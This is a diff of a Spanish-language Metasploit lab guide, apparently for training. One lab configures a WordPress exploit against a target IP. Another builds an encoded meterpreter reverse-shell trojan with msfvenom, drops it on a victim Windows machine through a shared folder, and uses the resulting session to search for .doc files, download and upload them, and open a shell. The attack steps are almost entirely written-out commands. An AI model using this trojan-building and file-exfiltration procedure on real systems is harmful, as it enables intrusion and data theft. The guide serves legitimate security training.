@@ -1,59 +1,52 @@
-EJERCICIO USO METASPLOIT
+## LABORATORIO 1 (INTERACCION BASICA)
 
-1. Podemos ver la carpeta con los archivos de Metasploit Framework
-
+1. Podemos ver la carpeta con los archivos de Metasploit Framework  
 **_cd /usr/share/metasploit-framework/_**
 
-1. Ahora ejecutamos la consola de Metasploit: **_msfconsole_**
-2. Ahora podemos buscar de la siguiente forma: **_search Type: exploit_**
-3. Podemos aplicar filtros ejemplo: **_search Type: exploit platform:windows_**
-4. Buscar vulnerabilidades comunes: **_search cve:2017_**
-5. Quiero atacar un sistema especifico: **_search name:wordpress_**
-6. Si queremos usarlo: use &lt;ruta/nombre&gt;
-
+2. Ahora ejecutamos la consola de Metasploit: **_msfconsole_**
+3. Ahora podemos buscar de la siguiente forma: **_search Type: exploit_**
+4. Podemos aplicar filtros ejemplo: **_search Type: exploit platform:windows_**
+5. Buscar vulnerabilidades comunes: **_search cve:2017_**
+6. Quiero atacar un sistema especifico: **_search name:wordpress_**
+7. Si queremos usarlo: use &lt;ruta/nombre&gt;  
 (**_use exploit/unix/webapp/wp_total_cache_exec_**)
-
-1. Dentro podemos ver los objetivos: **_show targets_**
-2. Podemos ver más información: **_show info_**
-3. Podemos ver las opciones: **_show Options_**
-4. Modificar su opción de IP REMOTE HOST: set RHOST &lt;IP OBJETIVO&gt;
-5. Volvemos a ver las opciones con **show Options** y veremos la IP configurada
-6. Ahora veremos los Payloads útiles relacionados a este exploit: **_show payloads_**
-7. Y podemos usar el payload de igual forma que antes con **_use &lt;name/ruta&gt;_**
-8. Dentro podemos ver las opciones del Payload con **_show options_**
-9. Y podemos establecer nuestra configuración del LOCAL HOST:
-
+8. Dentro podemos ver los objetivos: **_show targets_**
+9. Podemos ver más información: **_show info_**
+10. Podemos ver las opciones: **_show Options_**
+11. Modificar su opción de IP REMOTE HOST: set RHOST &lt;IP OBJETIVO&gt;
+12. Volvemos a ver las opciones con **show Options** y veremos la IP configurada
+13. Ahora veremos los Payloads útiles relacionados a este exploit: **_show payloads_**
+14. Y podemos usar el payload de igual forma que antes con **_use &lt;name/ruta&gt;_**
+15. Dentro podemos ver las opciones del Payload con **_show options_**
+16. Y podemos establecer nuestra configuración del LOCAL HOST:  
 **_set LHOST &lt;IP MAQUINA ATACANTE&gt;_**
-
-1. Y después de realizar todas las configuraciones de las opciones simplemente ejecutamos: **_exploit_**
+17. Y después de realizar todas las configuraciones de las opciones simplemente ejecutamos: **_exploit_**
 
 Esto no hará nada en específico ya que faltarían más opciones para poder ver un resultado ya que esto solo es una explicación de cómo utilizar Metasploit framework en una prueba de ejemplo.
 
 
-EJERCICIO CREACION DE TROYANO E INFILTRACION A OBJETIVO
+## LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)
 
-1. En la terminal de Kali levantaremos el servicio PostgreSQL:
-
+1. En la terminal de Kali levantaremos el servicio PostgreSQL:  
 **_service postgresql start_**
-
-1. Y abrimos la consola Metasploit: **_msfconsole_**
-2. Ejecutamos: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP KALI&gt; LPORT=&lt;5555&gt; -f exe -e x86/shikata_ga_nai -i 10 > trojan.exe** (Mas adelante explicare cada configuración)
-3. Creado el archivo deberíamos tenerlo en /Home por lo que copiaremos y meteremos a la carpeta creada (winmount) en la práctica pasada conectada a la maquina windows para enviar el troyano a la maquina víctima.
-4. Ahora en la consola de Metasploit ejecutar: **_use multi/handler_**
-5. Luego **_set payload windows/meterpreter/reverse_tcp_**
-6. Establecemos el host local: **_set LHOST &lt;IP MAQUINA KALI&gt;_**
-7. Y el Puerto: **_set LPORT 5555_**
-8. Y ejecutamos: **_exploit_**
-9. Regresamos a la maquina windows y volvemos a ejecutar el troyano
-10. Abierto el nuevo menú de meterpreter al establecer conexión con la maquina victima vemos la ayuda con el comando **_help_**
-11. Si queremos ver información del equipo ejecutamos: **_sysinfo_**
-12. Si queremos ver el directorio en el que estamos en la maquina windows a través de Kali: _ls_
-13. Para ver configuraciones de red: **_ipconfig_**
-14. Queremos buscar los archivos (.doc) en la maquina: **_search -f \*.doc_**
-15. Igual se puede con cualquier otro archivo, como ejemplo (.txt)
-16. Y si queremos descargarlo: download &lt;dirección del documento&gt; (Recuerda cambiar las barras a (/))
-17. Y de igual forma podemos subir un archivo**_: upload &lt;dirección origen kali&gt; &lt;dirección destino windows&gt;_** (Utilizando (\\) en esta última)
-18. Usar la consola de windows: **_Shell_**
+2. Y abrimos la consola Metasploit: **_msfconsole_**
+3. Ejecutamos: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP KALI&gt; LPORT=&lt;5555&gt; -f exe -e x86/shikata_ga_nai -i 10 > trojan.exe** (Mas adelante explicare cada configuración)
+4. Creado el archivo deberíamos tenerlo en /Home por lo que copiaremos y meteremos a la carpeta creada (winmount) en la práctica pasada conectada a la maquina windows para enviar el troyano a la maquina víctima.
+5. Ahora en la consola de Metasploit ejecutar: **_use multi/handler_**
+6. Luego **_set payload windows/meterpreter/reverse_tcp_**
+7. Establecemos el host local: **_set LHOST &lt;IP MAQUINA KALI&gt;_**
+8. Y el Puerto: **_set LPORT 5555_**
+9. Y ejecutamos: **_exploit_**
+10. Regresamos a la maquina windows y volvemos a ejecutar el troyano
+11. Abierto el nuevo menú de meterpreter al establecer conexión con la maquina victima vemos la ayuda con el comando **_help_**
+12. Si queremos ver información del equipo ejecutamos: **_sysinfo_**
+13. Si queremos ver el directorio en el que estamos en la maquina windows a través de Kali: _ls_
+14. Para ver configuraciones de red: **_ipconfig_**
+15. Queremos buscar los archivos (.doc) en la maquina: **_search -f \*.doc_**
+16. Igual se puede con cualquier otro archivo, como ejemplo (.txt)
+17. Y si queremos descargarlo: download &lt;dirección del documento&gt; (Recuerda cambiar las barras a (/))
+18. Y de igual forma podemos subir un archivo**_: upload &lt;dirección origen kali&gt; &lt;dirección destino windows&gt;_** (Utilizando (\\) en esta última)
+19. Usar la consola de windows: **_Shell_**
 
 EXTRA
 
@@ -69,7 +62,7 @@ EXTRA
 - **set payload windows/meterpreter/reverse_tcp**: Este comando configura el tipo de payload que se espera recibir en el handler. En este caso, estamos configurando el payload para Windows que establece una conexión de Shell inversa usando el módulo Meterpreter de Metasploit Framework y el método reverse_tcp.
 
 
-EJERCICIO EXPLORACION HERRAMIENTA ARMITAGE
+## LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)
 
 1. Levantar el servicio postgresql en la terminal
 2. Ejecutamos Armitage: **_armitage_**
